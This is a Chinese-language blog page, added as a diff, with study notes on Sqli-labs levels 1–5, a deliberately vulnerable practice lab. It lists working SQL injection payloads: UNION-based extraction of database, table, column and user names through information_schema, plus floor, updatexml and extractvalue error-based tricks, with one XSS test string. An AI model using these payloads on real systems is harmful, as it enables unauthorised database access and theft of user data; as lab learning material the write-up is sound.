@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html>
+    <!-- Head -->
+    <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="author" content="John Doe">
+    <meta name="description" itemprop="description" content="">
+    <meta name="keywords" content="">
+
+    <!-- Page Title -->
+    
+        <title>Sqli-labs（1-5关） | Hexo</title>
+    
+    <link rel="icon" href="/img/avatar-default.png">
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <link href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
+    
+    
+<script src="/js/script.js"></script>
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+    <style>
+        .deactiveColor{
+            color: #37474f;
+        }
+        .activeColor{
+            color: #006064;
+        }
+        a:hover{
+            color: #006064;
+        }
+        .header-btn{
+            color: #37474f;
+        }
+        
+        .post-content img{
+            margin: 50px auto;
+        }
+        
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+    <body>
+        <div class="container">
+
+            <!-- Top Anchor -->
+            <div id="top"></div>
+
+            <!-- Header -->
+            <header class="header-wrapper">
+    <div class="header-title-wrapper">
+        <!-- Page Title -->
+        <p class="header-title">
+             
+                
+                    Sqli-labs（1-5关）
+                
+            
+        </p>  
+    </div>    
+
+    
+        <!-- Division Line -->
+        <div class="division"></div> 
+    
+    
+    <div class="header-detail">
+        <!-- Header Button -->
+        <div class="header-btn-wrapper">
+            
+                <span>
+                    <a class="home-btn header-btn" href="/" title="homepage"><i class="fa fa-home"></i></a>
+                </span>
+
+                
+                    <span>
+                        <a class="catalog-btn header-btn"><i class="fa fa-list-ul"></i></a>
+                    </span>
+                
+            
+        </div>
+    </div>
+</header>
+
+            <!-- Main -->
+            <main>
+                <article class="post-wrapper">
+    
+
+    
+        <!-- Article Catalog -->
+        <div class="catalog-dropdown col-xs-12 col-sm-12">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Sqli-labs（1-5关）"><span class="toc-number">1.</span> <span class="toc-text">Sqli-labs（1-5关）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#第一关："><span class="toc-number">1.1.</span> <span class="toc-text">第一关：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-判断是数字型还是字符型"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">1.判断是数字型还是字符型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-猜字段数（用order-by排序-数字一个一个试）"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">2.猜字段数（用order by排序 数字一个一个试）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-联合查询"><span class="toc-number">1.1.0.3.</span> <span class="toc-text">3.联合查询</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-payload"><span class="toc-number">1.1.0.4.</span> <span class="toc-text">4.payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第二关："><span class="toc-number">1.2.</span> <span class="toc-text">第二关：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第三关："><span class="toc-number">1.3.</span> <span class="toc-text">第三关：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-判断字符型还是数字型"><span class="toc-number">1.3.0.1.</span> <span class="toc-text">1.判断字符型还是数字型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-猜字段order-by"><span class="toc-number">1.3.0.2.</span> <span class="toc-text">2.猜字段order by</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-联合查询注入"><span class="toc-number">1.3.0.3.</span> <span class="toc-text">3.联合查询注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-payload-1"><span class="toc-number">1.3.0.4.</span> <span class="toc-text">4.payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第四关："><span class="toc-number">1.4.</span> <span class="toc-text">第四关：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第五关："><span class="toc-number">1.5.</span> <span class="toc-text">第五关：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-判断"><span class="toc-number">1.5.0.1.</span> <span class="toc-text">1.判断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-payload："><span class="toc-number">1.5.0.2.</span> <span class="toc-text">2.payload：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#报错的类型："><span class="toc-number">1.6.</span> <span class="toc-text">报错的类型：</span></a></li></ol></li></ol>
+        </div>
+    
+
+    
+        <!--For now, Lightbox Only Show in Post Layout -->
+        
+
+        
+        
+            <!-- Article Img Lightbox -->
+            <div class="gallery">
+    
+    
+    <div class="lightbox">
+        <!-- Close Button -->
+        <span class="close-gallery">&times;</span>
+        
+        <!-- Photo -->
+        <img class="gallery-photo">
+    </div>
+</div>
+        
+    
+
+    
+
+    <!-- Article Content -->
+    <div class="post-content">
+        <h1 id="Sqli-labs（1-5关）"><a href="#Sqli-labs（1-5关）" class="headerlink" title="Sqli-labs（1-5关）"></a>Sqli-labs（1-5关）</h1><p><a href="https://baike.baidu.com/item/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/4766224?fr=aladdin#2" target="_blank" rel="noopener">基本的百度百科SQL注入攻击概念理解  参考链接</a></p>
+<p>很好的SQL注入步骤讲解<a href="https://www.cnblogs.com/puhk/p/12674740.html" target="_blank" rel="noopener"> 参考链接：https://www.cnblogs.com/puhk/p/12674740.html</a></p>
+<p>SQL注入方式：数字型和字符型。</p>
+<p>参考博客的链接：<a href="https://www.cnblogs.com/xyhacker/p/10022858.html" target="_blank" rel="noopener">https://www.cnblogs.com/xyhacker/p/10022858.html</a></p>
+<p>判断方式：</p>
+<blockquote>
+<p>1、数字型注入</p>
+<p>当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。</p>
+<p>测试步骤：(<strong>记得输入法改为中文！！</strong>)</p>
+<p>（1） 加单引号，URL：<code>www.text.com/text.php?id=3’</code></p>
+<p>对应的sql：select * from table where id=3’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；</p>
+<p>（2） 加and 1=1 ,URL：<code>www.text.com/text.php?id=3 and 1=1</code></p>
+<p>对应的sql：select * from table where id=3’ and 1=1 语句执行正常，与原始页面如任何差异；</p>
+<p>（3） 加and 1=2，URL：<code>www.text.com/text.php?id=3 and 1=2</code></p>
+<p>对应的sql：select * from table where id=3 and 1=2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异</p>
+<p>如果满足以上三点，则可以判断该URL存在数字型注入。</p>
+<p>2、字符型注入</p>
+<p>当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。</p>
+<p>例如数字型语句：select * from table where id =3</p>
+<p>则字符型如下：select * from table where name=’admin’</p>
+<p>因此，在构造payload时通过闭合单引号可以成功执行语句：</p>
+<p>测试步骤：</p>
+<p>（1） 加单引号：select * from table where name=’admin’’</p>
+<p>由于加单引号后变成三个单引号，则无法执行，程序会报错；</p>
+<p>（2） 加 ’and 1=1 此时sql 语句为：select * from table where name=’admin’ and 1=1’ ,也无法进行注入，还需要通过注释符号将其绕过；</p>
+<p>Mysql 有三种常用注释符：</p>
+<p>– 注意，这种注释符后边有一个空格</p>
+<p># 通过#进行注释</p>
+<p>/* */ 注释掉符号内的内容</p>
+<p>因此，构造语句为：select * from table where name =’admin’ and 1=1—’ 可成功执行返回结果正确；</p>
+<p>（3） 加and 1=2— 此时sql语句为：select * from table where name=’admin’ and 1=2 –’则会报错</p>
+<p>如果满足以上三点，可以判断该url为字符型注入。</p>
+</blockquote>
+<p><strong>常用系统函数</strong></p>
+<ol>
+<li>version()——MySQL 版本</li>
+<li>user()——数据库用户名</li>
+<li>database()——数据库名</li>
+<li>@@datadir——数据库路径</li>
+<li>@@version_compile_os——操作系统版本</li>
+</ol>
+<p><strong>字符串连接函数</strong></p>
+<ol>
+<li>concat(str1,str2,…)——没有分隔符地连接字符串</li>
+<li>concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串</li>
+<li>group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据     说着比较抽象，其实也并不需要详细了解，知道这三个函数能一次性查出所有信息就行了。</li>
+</ol>
+<p>一般用于测试是否存在注入</p>
+<pre><code>?? and 1=2–+
+
+‘and 1=2–+
+
+“and 1=2–+
+
+)and 1=2–+
+
+‘)and 1=2–+
+
+“)and 1=2–+
+
+“))and 1=2–+</code></pre><p>一般的代码为： $id=$_GET[‘id’]; $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”; 此处考虑两个点，一个是闭合前面你的 ‘ 另一个是处理后面的 ‘ ，一般采用两种思 路，闭合后面的引号或者注释掉，注释掉采用–+ 或者 #（%23）</p>
+<h2 id="第一关："><a href="#第一关：" class="headerlink" title="第一关："></a>第一关：</h2><h4 id="1-判断是数字型还是字符型"><a href="#1-判断是数字型还是字符型" class="headerlink" title="1.判断是数字型还是字符型"></a>1.判断是数字型还是字符型</h4><p> 得字符型</p>
+<p><img src="C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200513205214145.png" alt="image-20200513205214145"></p>
+<p><strong>问题1：我不是很理解报错这句话limit后面的意思，不明白1后面为啥有个单引号？</strong></p>
+<p>翻译（从right开始）：在第1行“1”限制0,1附近使用的正确语法。</p>
+<p>源码是  $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”; （源码在文件夹里边的index.php看）</p>
+<p>输入1’后变成$sql=”SELECT * FROM users WHERE id=’1’’ LIMIT 0,1 ‘’ </p>
+<p>我的想法：分别输入id=’1、1’、’’’1、’1 ,推测出报错格式应该如下，…use near ’id等号后面的内容’ at line 1;所以在不看源码的情况下我们才能推到源码会是id=’网页输入的内容’</p>
+<h4 id="2-猜字段数（用order-by排序-数字一个一个试）"><a href="#2-猜字段数（用order-by排序-数字一个一个试）" class="headerlink" title="2.猜字段数（用order by排序 数字一个一个试）"></a>2.猜字段数（用order by排序 数字一个一个试）</h4><p>即输入?id=1’order by 4–+ </p>
+<p>错误，多次尝试知晓只有三个字段（三个列）</p>
+<p><strong>问题2：为什么用–+呢？</strong></p>
+<p>答：为了注释掉后面的东西。#也可以注释，不用#的原因是url中#号是用来指导浏览器动作的（例如锚点），对服务器端完全无用。所以，HTTP请求中不包括#，将#号改成url的编码%23就可以了。（因为在<a href="http://test.ctf8.com/" target="_blank" rel="noopener">http://test.ctf8.com/</a> 这个XSS靶场 level2中我在url后输入”&gt;<script>alert(1)</script>#或者把#改成–+或– 或–space都可以过关，所以这边对于#用不了的解释存疑）使用–不行，原因–与后面的单引号连在一起没办法形成有效的SQL语句。还查到可以用–‘或–space注释掉,但是实践过发现– ‘（在’前加了个空格）或– space（space前加了个空格）才可行。</p>
+<h4 id="3-联合查询"><a href="#3-联合查询" class="headerlink" title="3.联合查询"></a>3.联合查询</h4><p>即输入?id=-1’union select 3,2,1–+</p>
+<p>发现后面两个位置，即上面2,1两处输入的东西可在网页上显示。</p>
+<p>使用 union 参数进行联合查询注入，union前面的参数报错才能执行union后面的数据（原因在下面），因此将 id = 1 改为 id = -1 （即把id值设为非正数（负数或0），浮点数，字符型或字符串）开始进行注入。</p>
+<p>联合查询注入利用的前提条件：页面上有显示位</p>
+<p><strong>问题3：什么是显示位？</strong></p>
+<p>答：在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数据展示在页面中，这个展示数据的位置就叫显示位。</p>
+<p><strong>union前面的参数报错才能执行union后面的数据原因：</strong></p>
+<pre><code>源码：
+$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
+$result=mysqli_query($con, $sql);
+$row = mysqli_fetch_array($result, MYSQLI_BOTH);
+
+    if($row)
+    {
+      echo &quot;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&quot;;
+      echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];
+      echo &quot;&lt;br&gt;&quot;;
+      echo &#39;Your Password:&#39; .$row[&#39;password&#39;];
+      echo &quot;&lt;/font&gt;&quot;;
+      }</code></pre><p>mysqli_query(connection,query,resultmode); </p>
+<p>connection</p>
+<p>必需。规定要使用的 MySQL 连接。</p>
+<p>query</p>
+<p>必需，规定查询字符串。</p>
+<p>resultmode</p>
+<p>可选。一个常量。可以是下列值中的任意一个：</p>
+<p>MYSQLI_USE_RESULT（如果需要检索大量数据，请使用这个）</p>
+<p>MYSQLI_STORE_RESULT（默认）</p>
+<blockquote>
+<p>mysql_fetch_array(<em>data</em>,<em>array_type</em>) 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有，返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false。</p>
+<p>UNION的作用是将两个select查询结果合并，程序在展示数据的时候通常只会取结果集的第一行数据，看一下源码，mysql_fetch_array只被调用了一次，而mysql_fetch_array从结果集中取得一行作为关联数组或数字数组或二者兼有，具体看第二个参数是什么。所以这里无论怎么折腾最后只会出来第一行的查询结果。只要让第一行查询的结果是空集，即union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了，然后我们就得到了显示位。</p>
+</blockquote>
+<p>上面这段仍看不懂可细看这个博客,参考链接：<a href="https://blog.csdn.net/weixin_42277564/java/article/details/80583959" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42277564/java/article/details/80583959</a></p>
+<p>Union 后面的select 什么用？select 1,2,3…如果没有指向某个表，那么它意味着输出1,2,3。</p>
+<p><a href="https://blog.csdn.net/weixin_44840696/article/details/89166154" target="_blank" rel="noopener">select参考博客</a></p>
+<p><strong>问题4：那为什么order by 前面的id不用等于-1就可以执行？</strong></p>
+<p>答：因为order by 用不着执行到下面。</p>
+<h4 id="4-payload"><a href="#4-payload" class="headerlink" title="4.payload"></a>4.payload</h4><p>（意为有效载荷，简单说就是对于接收者有用的数据；因为前面我们查到有两个位置可以在页面上显示，所以我们就可以利用这两个位置来得到我们想要的信息）</p>
+<p><a href="https://www.cnblogs.com/jiersixi/p/11784769.html" target="_blank" rel="noopener">payload的一些知识的参考博客</a></p>
+<p>1)输入?id=-1’union select 1,database(),3 –+ 注当前数据库名</p>
+<p><img src="C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200513210135523.png" alt="image-20200513210135523"></p>
+<p>2)输入?id=-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=”security”–+ 注表名</p>
+<p>（备注：information_schema数据库是mysql自带的，【INFORMATION_SCHEMA 数据库】 是MySQL自带的，它提供了访问数据库 元数据 的方式。什么是 元数据 呢？元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。</p>
+<p>有些时候用于表述该信息的其他术语包括“数据词典”和“系统目录”。</p>
+<p>在MySQL中，把【INFORMATION_SCHEMA】 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。</p>
+<p>在 【INFORMATION_SCHEMA 】中，有数个 只读 表。它们实际上是 视图 ，而不是基本表，因此，你将无法看到与之相关的任何文件。</p>
+<p><a href="http://www.luyixian.cn/news_show_9165.aspx" target="_blank" rel="noopener">http://www.luyixian.cn/news_show_9165.aspx</a></p>
+<p>（table_schema即数据表所属的数据库名）</p>
+<p><img src="C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200513210321131.png" alt="image-20200513210321131"></p>
+<p>3)输入?id=-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’ –+注某张表的字段，这里以users为例</p>
+<p>（Table_name：表名称）</p>
+<p><img src="C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200513210339398.png" alt="image-20200513210339398"></p>
+<p>4）输入?id=-1’ union select 1,group_concat(username),3 from security.users –+注字段的值，这里注 users 表里的 usrname 字段为例</p>
+<p><img src="C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200513210359537.png" alt="image-20200513210359537"></p>
+<p>【备注：</p>
+<p>1）函数database（）返回当前数据库名</p>
+<p>2）字段名即table_schema等的参考链接：<a href="https://www.cnblogs.com/shoshana-kong/p/10979295.html" target="_blank" rel="noopener">简单版</a>     <a href="https://wenku.baidu.com/view/6358a5fd89eb172ded63b7a8.html" target="_blank" rel="noopener">详细版</a></p>
+<p>3）group_concat(name,sex)结果：左边显示组名，右边想显示该组别下的所有成员信息。</p>
+<p>因为group_concat函数可以一次性查出所有信息，所以用它。</p>
+<p>group_concat函数的用法的参考链接：<a href="https://www.cnblogs.com/baizhanshi/p/10918711.html" target="_blank" rel="noopener">https://www.cnblogs.com/baizhanshi/p/10918711.html</a>】</p>
+<p>参考链接1 ：<a href="https://www.jianshu.com/p/ac546306f1e8" target="_blank" rel="noopener"> https://www.jianshu.com/p/ac546306f1e8</a></p>
+<p>参考链接2：<a href="http://www.secist.com/archives/4880.html" target="_blank" rel="noopener">  http://www.secist.com/archives/4880.html</a></p>
+<h2 id="第二关："><a href="#第二关：" class="headerlink" title="第二关："></a>第二关：</h2><p>1.判断字符型还是数字型 得数字型</p>
+<p>2.猜字段order by</p>
+<p>3.联合查询union select</p>
+<p>4.payload：去掉’输入得结果，均与第一题一样。</p>
+<h2 id="第三关："><a href="#第三关：" class="headerlink" title="第三关："></a>第三关：</h2><h4 id="1-判断字符型还是数字型"><a href="#1-判断字符型还是数字型" class="headerlink" title="1.判断字符型还是数字型"></a>1.判断字符型还是数字型</h4><p>输入?id=1’报错发现有个)</p>
+<p>跟第一题进行对比后发现，此题id格式应为id=(‘1’)。</p>
+<p><strong>【</strong>做题的时候输入法忘记改了，为中文，然后我发现id等号后面输入中文单引号，括号为中文或英文的时候都没有报错，我就很奇怪，后来想一下可能之所以中文单引号没报错是因为他没把它当单引号】</p>
+<p>第一题为基于错误的GET单引号字符型注入，第三题为基于错误的GET单引号变形字符型注入。</p>
+<h4 id="2-猜字段order-by"><a href="#2-猜字段order-by" class="headerlink" title="2.猜字段order by"></a>2.猜字段order by</h4><p>输入?id=1’) order by 4–+ 得字段为3</p>
+<h4 id="3-联合查询注入"><a href="#3-联合查询注入" class="headerlink" title="3.联合查询注入"></a>3.联合查询注入</h4><p>输入?id=-1’) union select 1,2,3–+</p>
+<h4 id="4-payload-1"><a href="#4-payload-1" class="headerlink" title="4.payload"></a>4.payload</h4><p>输入?id=-1’) union select 1,database(),3–+</p>
+<p>输入?id=-1’) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=”security”–+</p>
+<p>输入?id=-1’) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’ –+</p>
+<p>输入?id=-1’) union select 1,group_concat(username),3 from security.users–+</p>
+<h2 id="第四关："><a href="#第四关：" class="headerlink" title="第四关："></a>第四关：</h2><p>1.判断整型或字符型 </p>
+<p>得基于错误的GET双引号字符型注入，故除了需要把 ’) 改成 ”) 其他均跟上文一样。</p>
+<p>2.猜字段 order by</p>
+<p>3.联合查询注入</p>
+<p>4.payload</p>
+<h2 id="第五关："><a href="#第五关：" class="headerlink" title="第五关："></a>第五关：</h2><h4 id="1-判断"><a href="#1-判断" class="headerlink" title="1.判断"></a>1.判断</h4><p>输入?id=1没错，输入?id=1’报错</p>
+<p>这道题没有显示位，所以得用双查询报错注入</p>
+<p>双查询注入详解参考的链接：<a href="https://www.2cto.com/article/201303/192718.html" target="_blank" rel="noopener">https://www.2cto.com/article/201303/192718.html</a></p>
+<blockquote>
+<p>归纳：</p>
+<p>1）查询数据库名：</p>
+<p>select count(<em>), concat((select database()), floor(rand()</em>2))as a from information_schema.tables group by a;</p>
+<p>2）查询版本：</p>
+<p>select count(<em>), concat((select version()), floor(rand()</em>2))as a from information_schema.tables group by a;</p>
+<p>3）查询用户名：</p>
+<p>select count(<em>), concat(‘<del>‘,(select user()),’</del>‘, floor(rand()</em>2))as a from information_schema.tables group by a;</p>
+<p>4）查询派生表：</p>
+<p>select 1 from (select count(<em>), concat(‘<del>‘,(select user()),’</del>‘, floor(rand()</em>2))as a from information_schema.tables group by a)x;</p>
+</blockquote>
+<h4 id="2-payload："><a href="#2-payload：" class="headerlink" title="2.payload："></a>2.payload：</h4><p>1）输入?id=-1’ union select 1,count(<em>),concat(database(),floor(rand(0)</em>2))x from information_schema.tables group by x;–+ 得到数据库名</p>
+<p>2）输入?id=-1’ union select 1,count(<em>),concat((select table_name from information_schema.tables where table_schema=”security” limit 1,1),floor(rand(0)</em>2))x from information_schema.tables group by x;–+ 得到表名</p>
+<p>3）输入?id=-1’ union select 1,count(<em>),concat((select column_name from information_schema.columns where table_name=’users’ limit 1,1),floor(rand(0)</em>2))x from information_schema.tables group by x;–+ 得到users表的字段</p>
+<p>4）输入?id=-1’ union select 1,count(<em>),concat((select username from security.users limit 1,1),floor(rand(0)</em>2))x from information_schema.tables group by x;–+ 得到users表的username字段的值</p>
+<p><strong>问题6</strong>：可是明明就没有爆出users这个表名，只得到referers,怎么才能看到所有的表名呢？</p>
+<p>答：会对此产生疑问是因为没有理解limit（1,1）；LIMIT m,n指从第m+1条开始，取n条。该题只能显示一条，所以n=2的时候会报错。当m=3的时候出来的表名就是users。</p>
+<h2 id="报错的类型："><a href="#报错的类型：" class="headerlink" title="报错的类型："></a>报错的类型：</h2><p>参考博客：<a href="https://blog.csdn.net/weixin_42277564/article/details/80635586" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42277564/article/details/80635586</a></p>
+<blockquote>
+<p>1.通过floor报错<br>     and (select 1 from (select count(<em>),concat((payload),floor (rand(0)</em>2))x     from information_schema.tables group by x)a)<br>     其中payload为你要插入的SQL语句<br>     需要注意的是该语句将     输出字符长度限制为64个字符</p>
+<p>注：输出字符长度限制为64个字符payload填sql语句如查询当前数据库</p>
+<p><a href="http://127.0.0.1/sql/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (select 1 from (select </p>
+<p>count(<em>),concat((database()),floor(rand(0)</em>2))x from information_schema.tables group by x)a)%23</p>
+<p>2.通过updatexml报错<br>     and updatexml(1,payload,1)</p>
+<p>and updatexml(1,concat(0x7e,@@version,0x7e),1)</p>
+<p>同样该语句对输出的字符长度也做了限制，其最长输出32位<br> 并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效</p>
+<p>3.通过ExtractValue报错</p>
+<p>and extractvalue(1, payload)</p>
+<p>and extractvalue(1, concat(0x7e,@@version,0x7e))<br> 输出字符有长度限制，最长32位。</p>
+</blockquote>
+  
+    </div> 
+
+    
+        <!-- Division Line -->
+        <div class="division"></div> 
+    
+
+    <div class="post-info-wrapper">
+            
+                    <!-- Post Info -->
+                    <p class="post-date">2020-05-14</p>
+                    
+                    
+                        <p class="post-info-categories">
+                            
+                        </p>
+                    
+
+                    
+            
+    </div>
+</article>
+
+
+    
+
+            </main>
+
+            <!-- 'To Top' Btn-->
+            
+                <div id="to-top">
+    <a href="#top" class="toTop">
+        <i class="fa fa-pagelines"></i>
+    </a>
+</div>
+            
+
+            <!-- Footer -->
+            
+                <footer class="footer-wrapper col-xs-12 col-sm-12">
+    <div class="footer-banner-wrapper">
+        <p class="footer-banner">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener" title="Hexo">Hexo</a></p>
+        <P class="footer-banner">Theme <a href="https://github.com/Lonezj/hexo-theme-wind" target="_blank" rel="noopener" title="Wind">wind</a></P>
+    </div>
+</footer>
+            
+        </div>
+
+        <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.css">
+        <link rel="stylesheet" href="/css/google-prettify-monokai.css" type="text/css">
+        <script src="//cdn.bootcss.com/prettify/r298/prettify.min.js" type="text/javascript"></script>
+    </body>
+</html>
